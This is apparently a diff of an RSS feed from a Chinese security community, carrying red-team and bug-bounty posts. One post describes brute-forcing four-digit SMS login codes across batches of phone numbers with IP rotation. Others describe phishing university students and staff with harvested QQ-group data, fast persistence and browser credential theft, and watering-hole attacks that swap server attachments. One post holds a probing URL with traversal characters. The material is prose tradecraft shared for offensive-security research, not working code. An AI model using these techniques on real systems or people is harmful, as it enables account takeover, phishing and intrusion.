-&lt;p&gt;大家有时间的话可以试用一下这款小工具，有任何不足的地方可以提交issue。希望这款工具可以助力大家更方便的挖掘更多越权漏洞。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2978-aisrc</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2978-aisrc</guid><pubDate>Tue, 04 Mar 2025 06:45:10 GMT</pubDate><author>Ed1s0n</author><category>原创文章</category><category>应用安全</category><category>tool</category><category>挖洞姿势</category><category>tools</category></item><item><title>红队实战：谈一谈红队中的钓鱼姿势实战版</title><description>&lt;h3&gt;前言&lt;/h3&gt;
+&lt;p&gt;大家有时间的话可以试用一下这款小工具，有任何不足的地方可以提交issue。希望这款工具可以助力大家更方便的挖掘更多越权漏洞。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2978-aisrc</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2978-aisrc</guid><pubDate>Tue, 04 Mar 2025 06:45:10 GMT</pubDate><author>Ed1s0n</author><category>原创文章</category><category>tool</category><category>挖洞姿势</category><category>应用安全</category><category>tools</category></item><item><title>红队实战：谈一谈红队中的钓鱼姿势实战版</title><description>&lt;h3&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;红队钓鱼社工姿势关于近源场景的详细实战案例来了，这里先简单介绍一点儿小设备，这种工具非BadUSB类的，毕竟badusb的那种方式放在七八年前还好使，现在拿出来玩儿玩儿可以，实战中还是算了，成本高收益小。&lt;/p&gt;
 
@@ -3314,50 +4065,50 @@ java -version&lt;/code&gt;&lt;/pre&gt;
 
 
 
-</description><link>https://zone.huoxian.cn/d/2977</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2977</guid><pubDate>Mon, 03 Mar 2025 02:55:41 GMT</pubDate><author>和</author><category>原创文章</category><category>AIOT安全</category><category>精华内容</category><category>redteam</category></item><item><title>【挖洞之旅】一种验证码爆破漏洞的全新思路 | 简单实用</title><description>&lt;p&gt;​		以往，遇到验证码，测试爆破都是重发几次，如果有次数限制大家就不会继续挖了，其实还有个方法可以尝试，我已经通过这个方法得到不少赏金，希望思路对大家有用。&lt;/p&gt;
+</description><link>https://zone.huoxian.cn/d/2977</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2977</guid><pubDate>Mon, 03 Mar 2025 02:55:41 GMT</pubDate><author>和</author><category>原创文章</category><category>AIOT安全</category><category>精华内容</category><category>redteam</category></item><item><title>【挖洞之旅】一种验证码爆破漏洞的全新思路 | 简单实用</title><description>&lt;p&gt;以往，遇到验证码，测试爆破都是重发几次，如果有次数限制大家就不会继续挖了，其实还有个方法可以尝试，我已经通过这个方法得到不少赏金，希望思路对大家有用。&lt;/p&gt;
 
 &lt;p&gt;验证码认证分为两个步骤：&lt;/p&gt;
 
 &lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;请求验证码&lt;/li&gt;
 &lt;li&gt;校验验证码&lt;/li&gt;&lt;/ol&gt;
 
-&lt;p&gt;​		一般常见的验证码爆破就是在第二个校验阶段进行的，一般防护都会对校验次数进行验证，错误一定次数后验证码失效（tips：有时候它显示失效了，实际上还是可以用的 🤣 ）&lt;/p&gt;
+&lt;p&gt;一般常见的验证码爆破就是在第二个校验阶段进行的，一般防护都会对校验次数进行验证，错误一定次数后验证码失效（tips：有时候它显示失效了，实际上还是可以用的 🤣 ）&lt;/p&gt;
 
 &lt;p&gt;其实还有一种新姿势，不说想到的人不多，但是一说出来你立刻就懂了。&lt;/p&gt;
 
 &lt;h3&gt;姿势&lt;/h3&gt;
 
-&lt;p&gt;​	方法很简单，如果步骤二的校验存在次数限制，此时我们只需要重新发一次验证码就可以再次进行爆破了。你肯定会想“验证码不会更新吗？更新了你还怎么爆破！”&lt;/p&gt;
+&lt;p&gt;方法很简单，如果步骤二的校验存在次数限制，此时我们只需要重新发一次验证码就可以再次进行爆破了。你肯定会想“验证码不会更新吗？更新了你还怎么爆破！”&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739951524-480960-fd277457-5a69-4866-bc5b-5667008a606a.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
 
-&lt;p&gt;​	其实这个不重要！说是验证码爆破，其实叫验证码碰撞更贴切一点。整体思路就是固定几个验证码，校验验证码可以有几次机会就固定几个，然后不断自动生成验证码，只要生成的验证码正巧中了你固定的那几个验证码，你就成功了。&lt;br&gt;
+&lt;p&gt;其实这个不重要！说是验证码爆破，其实叫验证码碰撞更贴切一点。整体思路就是固定几个验证码，校验验证码可以有几次机会就固定几个，然后不断自动生成验证码，只要生成的验证码正巧中了你固定的那几个验证码，你就成功了。&lt;br&gt;
 利用这个方法的核心就是请求验证码，这个需要发送验证码时没有人机验证，或者能绕过人机验证（绕过这个就看大佬们自己的各种神通了），所以能使用这个方法的时候，一般都会有伴生漏洞（定向短信轰炸、横向短信轰炸）&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739952110-969608-84f6020a-d625-4ed3-bc2c-2c5c4cdd4fe8.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
 
-&lt;p&gt;​	我们计算一下效率，4位数的验证码，有10000种组合，假设每个验证码可以碰撞5次，那么成功率就是5/10000=0.0005，也就是0.05%，平均需要碰撞1/0.05%=2000次，不看网络卡顿的情况，大概也就2000秒，也就是2000/60=33.333333，半个小时作用。实际上一般会比这个快，经过我的多次成功平均时间来看，平均20分钟左右都可以成功。脸超级无敌黑的话就没办法了。&lt;/p&gt;
+&lt;p&gt;我们计算一下效率，4位数的验证码，有10000种组合，假设每个验证码可以碰撞5次，那么成功率就是5/10000=0.0005，也就是0.05%，平均需要碰撞1/0.05%=2000次，不看网络卡顿的情况，大概也就2000秒，也就是2000/60=33.333333，半个小时作用。实际上一般会比这个快，经过我的多次成功平均时间来看，平均20分钟左右都可以成功。脸超级无敌黑的话就没办法了。&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739952692-501379-521c1cd7-43c5-4d9d-979f-436a9855b2af.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
 
-&lt;p&gt;​	这个方法可以根据实际情况进行自己优化，比如限制每个手机号发送时间1分钟的话，可以准备70个手机号码，循环发送，或者多线程同时给多个手机号发送验证码，同时校验，可以大大增加成功率，减少碰撞时间，还有很多优化方法大佬们肯定比我懂得多，嘿嘿。&lt;/p&gt;
+&lt;p&gt;这个方法可以根据实际情况进行自己优化，比如限制每个手机号发送时间1分钟的话，可以准备70个手机号码，循环发送，或者多线程同时给多个手机号发送验证码，同时校验，可以大大增加成功率，减少碰撞时间，还有很多优化方法大佬们肯定比我懂得多，嘿嘿。&lt;/p&gt;
 
 &lt;h3&gt;实战案例&lt;/h3&gt;
 
-&lt;p&gt;​	下面上一个我的实战案例：&lt;/p&gt;
+&lt;p&gt;下面上一个我的实战案例：&lt;/p&gt;
 
-&lt;p&gt;​	某超市的项目，验证码登录逻辑有缺陷，可导致所有通过该方式验证登录的系统受到影响，通过横向爆破的方式登录系统。&lt;/p&gt;
+&lt;p&gt;某超市的项目，验证码登录逻辑有缺陷，可导致所有通过该方式验证登录的系统受到影响，通过横向爆破的方式登录系统。&lt;/p&gt;
 
-&lt;p&gt;​	通过抓包分析发现该系统的验证码为4位，且每次可以尝试验证码5次，每个IP每天限制发送验证码50+次，且无人机校验机制，因此可以直接通过脚本进行爆破。这个系统的验证阶段不是直接验证手机号和验证码的，而是第一步骤每个手机号发送验证码后会返回一个不同auth_code值，通过这个auth_code值和验证码来进行匹配校验。&lt;/p&gt;
+&lt;p&gt;通过抓包分析发现该系统的验证码为4位，且每次可以尝试验证码5次，每个IP每天限制发送验证码50+次，且无人机校验机制，因此可以直接通过脚本进行爆破。这个系统的验证阶段不是直接验证手机号和验证码的，而是第一步骤每个手机号发送验证码后会返回一个不同auth_code值，通过这个auth_code值和验证码来进行匹配校验。&lt;/p&gt;
 
-&lt;p&gt;​	脚本逻辑大致如下：&lt;/p&gt;
+&lt;p&gt;脚本逻辑大致如下：&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739954686-925824-97bb1287-711d-44b5-a863-15e9768b666f.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
 
 
-&lt;p&gt;​	准备大量手机号，分成50个一组，同时对50个手机号发送验证码，获得50个对应的auth_code，然后再对50个auth_code进行第1个验证码尝试，失败了再对下一个验证码尝试，每次可以同时验证50个验证码提高了效率。5次机会用完再切换IP，对下一组手机号发起验证码。以此类推。&lt;/p&gt;
+&lt;p&gt;准备大量手机号，分成50个一组，同时对50个手机号发送验证码，获得50个对应的auth_code，然后再对50个auth_code进行第1个验证码尝试，失败了再对下一个验证码尝试，每次可以同时验证50个验证码提高了效率。5次机会用完再切换IP，对下一组手机号发起验证码。以此类推。&lt;/p&gt;
 
-&lt;p&gt;​	成功的概率：4位数验证码有10000种组合，每个手机号可以尝试5次，也就是5/10000&lt;em&gt;100=0.05%，然后每一轮可以测试50个手机号，每轮成功的概率为0.05&lt;/em&gt;50=2.5%。这碰撞成功的概率还是挺高的（因为有IP限制，所以我用了地址池，实际大家可以根据实际情况自己更新优化步骤）。&lt;/p&gt;
+&lt;p&gt;成功的概率：4位数验证码有10000种组合，每个手机号可以尝试5次，也就是5/10000&lt;em&gt;100=0.05%，然后每一轮可以测试50个手机号，每轮成功的概率为0.05&lt;/em&gt;50=2.5%。这碰撞成功的概率还是挺高的（因为有IP限制，所以我用了地址池，实际大家可以根据实际情况自己更新优化步骤）。&lt;/p&gt;
 
 &lt;p&gt;具体步骤如下：&lt;/p&gt;
 
@@ -3396,7 +4147,7 @@ def sent_code1(http_raw, data_list: list):
 &lt;p&gt;这个姿势技术性不强，核心还是思路，感觉有用的给我点点赞，祝看官师傅天天高危不重复，嘿嘿嘿&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739954931-51503-ea755c60-dc54-4c50-8d9c-035c7b54df46.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-</description><link>https://zone.huoxian.cn/d/2975</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2975</guid><pubDate>Wed, 19 Feb 2025 08:57:39 GMT</pubDate><author>cc55y</author><category>原创文章</category><category>实战攻防</category><category>挖洞姿势</category><category>精华内容</category></item><item><title>https://www.huoxian.cn/$#$=?/##################//?id1</title><description>&lt;p&gt;content=&lt;a href=&quot;https://www.huoxian.cn/$#$=%28*?%29/##################/filename=file../?id=1&amp;amp;id--&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://www.huoxian.cn/$#$=(*?)/##################/filename=file../?id=1&amp;amp;id--&lt;/a&gt;&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2973-httpswwwhuoxiancnid1</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2973-httpswwwhuoxiancnid1</guid><pubDate>Sat, 15 Feb 2025 06:22:41 GMT</pubDate><author>HUOXIAN</author><category>应用安全</category></item><item><title>红队攻防中HW的一些艺术</title><description>&lt;h2&gt;0x1 攻防的研究思考&lt;/h2&gt;
+</description><link>https://zone.huoxian.cn/d/2975</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2975</guid><pubDate>Wed, 19 Feb 2025 08:57:39 GMT</pubDate><author>cc55y</author><category>原创文章</category><category>挖洞姿势</category><category>实战攻防</category><category>精华内容</category></item><item><title>红队攻防中HW的一些艺术</title><description>&lt;h2&gt;0x1 攻防的研究思考&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-Markdown&quot;&gt;渗透的本质是信息收集，攻防的体系是知识点的串联。&lt;/code&gt;&lt;/pre&gt;
 
@@ -3579,7 +4330,7 @@ Options:
 
 
 
-</description><link>https://zone.huoxian.cn/d/2969-hw</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2969-hw</guid><pubDate>Fri, 10 Jan 2025 02:54:22 GMT</pubDate><author>routing</author><category>应用安全</category><category>实战攻防</category><category>挖洞姿势</category><category>信息收集</category></item><item><title>谈一谈红队种的钓鱼姿势（下）</title><description>&lt;h3&gt;序&lt;/h3&gt;
+</description><link>https://zone.huoxian.cn/d/2969-hw</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2969-hw</guid><pubDate>Fri, 10 Jan 2025 02:54:22 GMT</pubDate><author>TryTset</author><category>挖洞姿势</category><category>应用安全</category><category>实战攻防</category><category>信息收集</category></item><item><title>谈一谈红队种的钓鱼姿势（下）</title><description>&lt;h3&gt;序&lt;/h3&gt;
 
 &lt;p&gt;因为系列已发，所以就画个句号吧，最后一篇文了，src见过定级扯皮的，没想到投稿评审也得扯皮【笑哭】，所有示意图均为自画，禁止盗图呦，ahhh&lt;/p&gt;
 
@@ -3651,156 +4402,7 @@ Options:
 
 &lt;h4&gt;小结&lt;/h4&gt;
 
-&lt;p&gt;这两年这集中攻击方案在行动中屡试不爽，目前也没碰见比三级网闸更复杂的情况，在规则允许的情况下，事实上YL行业我倒觉得是众多行业内还算比较容易出成果的，钓鱼其实还好，社工以及近源最大的问题就是“偷感”太重，欢迎交流，有碰撞才有新思路。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2967</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2967</guid><pubDate>Tue, 07 Jan 2025 09:44:45 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>火线Zone 24年11月、12月技术文章奖励公示</title><description>&lt;p&gt;亲爱的火线Zone社区成员们，&lt;/p&gt;
-
-&lt;p&gt;自火线Zone征稿奖励方案启动以来，我们收到了众多技术专家的杰出投稿。这些高质量的原创技术文章不仅丰富了我们的社区知识库，也极大地促进了安全技术的交流与分享。在此，我们对所有积极参与的创作者表示衷心的感谢，并希望激励更多的技术专家加入我们的行列，共同推动技术安全生态的繁荣发展。&lt;/p&gt;
-
-&lt;h3&gt;优秀文章奖&lt;/h3&gt;
-
-&lt;p&gt;经过严格的审核流程，以下文章凭借其深度分析和独到见解，荣获“优秀文章奖”，各获得&lt;strong&gt;50查克拉积分 + 500RMB&lt;/strong&gt;的奖励：&lt;/p&gt;
-
-&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2960-hvv/5&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;近期某省级HVV实战回忆录&lt;/a&gt;&lt;/strong&gt; 作者：和&lt;/li&gt;&lt;/ol&gt;
-
-&lt;h3&gt;基础投稿奖&lt;/h3&gt;
-
-&lt;p&gt;以下文章也通过了我们的审核，符合基础投稿奖励要求，每位作者将获得&lt;strong&gt;50查克拉积分&lt;/strong&gt;的奖励：&lt;/p&gt;
-
-&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2961-ndayprojectsend-cve-2024-11680&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;【Nday漏洞分析】ProjectSend 身份认证绕过漏洞(CVE-2024-11680)&lt;/a&gt;&lt;/strong&gt; 作者：jylove&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2963/2&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;分享最近一次渗透测试岗位面试经验&lt;/a&gt;&lt;/strong&gt; 作者：looklook&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2964&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;谈一谈红队中的社工钓鱼姿势(上)&lt;/a&gt;&lt;/strong&gt; 作者：和&lt;/li&gt;&lt;/ol&gt;
-
-&lt;h3&gt;奖励发放说明&lt;/h3&gt;
-
-&lt;ul&gt;&lt;li&gt;所有获得奖励的文章将同步发表在&lt;strong&gt;火线Zone&lt;/strong&gt;公众号上，以飨更广泛的读者群体。&lt;/li&gt;
-&lt;li&gt;奖励将在每月的第一周统一发放，涵盖上月投稿的所有合格文章。请获奖者留意自己的火线安全平台账户。&lt;/li&gt;
-&lt;li&gt;如对奖励有任何异议或疑问，请及时联系&lt;strong&gt;火线小助手&lt;/strong&gt;。&lt;/li&gt;&lt;/ul&gt;
-
-&lt;h3&gt;内容征集及奖励方案详情&lt;/h3&gt;
-
-&lt;p&gt;我们诚邀更多的技术专家加入火线Zone社区，共同构建技术安全生态。更多内容征集及奖励方案详情请访问：&lt;a href=&quot;https://zone.huoxian.cn/d/2891-zone-24&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;火线Zone社区规则升级，共建技术安全生态&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3&gt;结语&lt;/h3&gt;
-
-&lt;p&gt;火线Zone社区对每一位创作者的辛勤工作和贡献表示最深的敬意。我们期待在未来的日子里，继续与您携手合作，共同书写技术安全的新篇章。&lt;/p&gt;
-
-&lt;p&gt;再次感谢所有支持火线Zone的朋友们！&lt;/p&gt;
-
-&lt;p&gt;火线Zone社区团队&lt;br&gt;
-2025年1月&lt;/p&gt;
-
-&lt;hr&gt;
-
-&lt;p&gt;版权声明： 本文内容由火线Zone社区原创发布，未经允许，不得转载或用于商业用途。如需转载，请遵守转载说明中的相关规定。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2966-zone-241112</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2966-zone-241112</guid><pubDate>Mon, 06 Jan 2025 08:16:50 GMT</pubDate><author>小火子</author><category>官方公告</category></item><item><title>谈一谈红队钓鱼中的姿势（中）</title><description>&lt;h4&gt;前言&lt;/h4&gt;
-
-&lt;p&gt;这篇主要接上篇，当然配合红队实战中的案例来说明，接上篇的钓鱼。主这篇文章主要以JY和ZW行业来选择钓鱼姿势。&lt;/p&gt;
-
-&lt;h3&gt;JY行业&lt;/h3&gt;
-
-&lt;p&gt;JY行业有JY专线，所以选择JYJ或者JYT为靶标的时候可以尝试从EDU入手，为什么不考虑小中高的原因是因为第一资产少，大部分学校在公网上的业务主要都是一堆静态的HTML还是前后台分离的，并且大部分业务都在公有云上，运气好的话可以突破边界进入某个学校的内网却根本摸不到厅，纯纯浪费精力，性价比太低。所以在选择靶标尽可能选择EDU，并且在稍微级别高一点儿的红队活动中，有JYT就一定EDU，所以在选择通过EDU突破JY专网到厅里还是可以选择迂回的，就算EDU靶标不是自己的靶标，没出局的靶标后期一般会放开，成果不一致后期基本上也可以提交，性价比挺高的。&lt;/p&gt;
-
-&lt;p&gt;选择EDU钓鱼的话可以优先选择有VPN的。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140302-882807-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;比如&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140321-28488-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;一般大学都会有vpn，可以从VPN类型看出一个学校VPN面向的对象。&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;有专有VPN客户端或者商用VPN产品的一般对象基本会面向全校师生。这个时候选择钓鱼的对象会比较大且成功率高。&lt;/li&gt;
-&lt;li&gt;如果是SSLVPN的基本上限制会比较大，比如说入网用户一般都伴随申请等，这个时候面向的对象会使小部分群体，就vpn来讲钓鱼的成功率很低。（图片资产测绘检索的）&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;[upl-image-preview url=&lt;a href=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140341-967615-image.png&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140341-967615-image.png&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;不过费劲巴拉的一波钓鱼，会出现两种情况&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;VPN登录进入了，但是没有资源分配，事实上大部分高校的资源（我遇见的）基本上给的资源都只有&lt;strong&gt;图书馆+教务系统&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140357-643444-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;运气比较好，运维安全意识比较低的资源会给&lt;strong&gt;ALL&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
-
-&lt;h5&gt;JY行业的网络状况&lt;/h5&gt;
-
-&lt;p&gt;我目前遇见的JY的高校重要核心业务的网络情况基本上都是可以出网的，没有碰见不出网的情况，所以基本上不用考虑机器拿下了死活不出网，如果存在这种现象，基本上不需要怀疑其他的，只需要怀疑是不是自己的服务器被打标签之类的，因为目前一些设备的&lt;strong&gt;阻断是基于情报&lt;/strong&gt;，各大厂商的服务器都是有一次更换公网地址的机会的，不过现在的状况是就算换了ip也可能依旧被打标签。&lt;/p&gt;
-
-&lt;h4&gt;信息搜集关键点&lt;/h4&gt;
-
-&lt;ul&gt;&lt;li&gt;信息搜集从&lt;strong&gt;QQ群来、二手闲置交易群&lt;/strong&gt;来效率最高。尤其在用学号等，不过建议搭配社工Ku使用，手机号等结合使用效果会更好。&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140382-654658-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;这里可利用群进行精准钓鱼，最好的选择是新生群，避免学生离校实习等情况，容易打偏。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736141870-101754-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;一般高校的VPN绑定都是学号，配合用户的口令复用即可突破边界&lt;/li&gt;
-&lt;li&gt;高校小小程序和定制化开发的app，这里需要注意的是部分高校的app绑定的是手机号而不是学号，使用web端的口令和密码是无法进行登录的。这里的信息搜集仅针对部分高校的部分应用有效&lt;/li&gt;
-&lt;li&gt;不要忽略高校表白墙+新生群，这里是可以确定所谓的校园宽带是不是真正的”校园网“，因为确实发现部分学校的校园网比较假，是运营商的网络，跟学校内网业务是真正意义上的两张网&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140399-174841-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;事实上你可以永远相信一个高校的万能墙和表白墙。&lt;/p&gt;
-
-&lt;h4&gt;权限维持&lt;/h4&gt;
-
-&lt;p&gt;对于钓鱼高校用户成功率可以说是最高的，但是尤其需要注意的有两点&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;手速要快，权限维持要尽快做好，包括定时任务。因为高校用户的终端太容易关机了。在没有获取稳定的隧道的条件下，手速一定要快，这样才能实现可持续。&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736141908-519116-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;确定好内网业务段，所以密码抓取的速度要快，浏览器的历史记录以及存储的账号密码是实现进一步攻击的有效保障。&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736141920-204945-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;h4&gt;横向&lt;/h4&gt;
-
-&lt;p&gt;针对于高校来讲，用户的体量比较大，之前跟多个高校的网络中心其实是有过交流的，对于高校来说，探针以及联动策略不可能做的很精细化，容易影响业务，另外针对用户的ip地址是不会IP和MAC绑定的，校园网顶多可以精确到学号手机号，阻断封禁时间也是比较短的，所以钓鱼获取到机器后直接一把梭就ok，不用担心溯源的问题，毕竟溯源的难度大周期性长。当然获取内网服务器后横向还是要注意规避流量探针的。&lt;/p&gt;
-
-&lt;p&gt;内网获取业务系统的权限可以注意配合使用&lt;strong&gt;水坑攻击&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143460-301763-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;这是在一次行动中获取的答题系统，通过某个漏洞获取了系统的权限，通过CS上线后进行水坑攻击，修改服务器中的&lt;strong&gt;附件&lt;/strong&gt;，进行钓鱼。这种利用水坑横向钓鱼更加精准，并且降低了上钩即被发现的风险。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143471-301897-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;h4&gt;邮箱钓鱼选择&lt;/h4&gt;
-
-&lt;p&gt;我目前钓鱼的话基本上是会选择两种邮箱，注意配合使用上一篇提到的签名&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;网易邮箱&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;QQ和网易邮箱，群收件人能看到其它收件人&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143484-47346-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;QQ邮箱&lt;/li&gt;&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143496-130783-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;（2024年底测试）&lt;/strong&gt;QQ邮箱进行批量发送，邮件在60封左右的时候，邮件已进垃圾邮件，但是网易进行发送的时候，批量发送，一次发送80封的时候邮件还没有进入&lt;strong&gt;垃圾邮件&lt;/strong&gt;。所以在发送钓鱼的时候注意，单次单发，且不同的用户尽可能发送不一致的内容以及不同哈希的附件，这样成功率稍高一点儿。&lt;/p&gt;
-
-&lt;h3&gt;ZW行业&lt;/h3&gt;
-
-&lt;p&gt;其实ZW基本上没啥说的，钓鱼成功的概率太低，主要原因有两点&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;ZW不出网&lt;/li&gt;
-&lt;li&gt;国产化现在太高了，基本上大一点儿的单位国产化概率有百分之八九十&lt;/li&gt;&lt;/ul&gt;
-
-&lt;h5&gt;突破口&lt;/h5&gt;
-
-&lt;p&gt;所以现在基本上针对ZW的钓鱼基本上Tricks有一个个&lt;/p&gt;
-
-&lt;ul&gt;&lt;li&gt;目标转向二三级单位，进内网容易且钓鱼成功率高&lt;/li&gt;&lt;/ul&gt;
-
-&lt;h5&gt;风险&lt;/h5&gt;
-
-&lt;p&gt;不是说二三级单位出网，而是二三级单位的网络规划以及管理相对来说比较薄弱，且二三级单位的国产化没那么高，有的甚至没有，从这一点儿迂回横向很好使，但是风险是容易找不到从二三级到一级单位的链路。&lt;/p&gt;
-
-</description><link>https://zone.huoxian.cn/d/2965</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2965</guid><pubDate>Mon, 06 Jan 2025 06:05:25 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>火线Zone 24年社区规则升级，共建技术安全生态</title><description>&lt;p&gt;火线Zone是由火线安全平台打造的安全技术专家聚集和交流的社区，旨在推动数智时代的安全生态。&lt;/p&gt;
+&lt;p&gt;这两年这集中攻击方案在行动中屡试不爽，目前也没碰见比三级网闸更复杂的情况，在规则允许的情况下，事实上YL行业我倒觉得是众多行业内还算比较容易出成果的，钓鱼其实还好，社工以及近源最大的问题就是“偷感”太重，欢迎交流，有碰撞才有新思路。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2967</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2967</guid><pubDate>Tue, 07 Jan 2025 09:44:45 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>火线Zone 24年社区规则升级，共建技术安全生态</title><description>&lt;p&gt;火线Zone是由火线安全平台打造的安全技术专家聚集和交流的社区，旨在推动数智时代的安全生态。&lt;/p&gt;
 
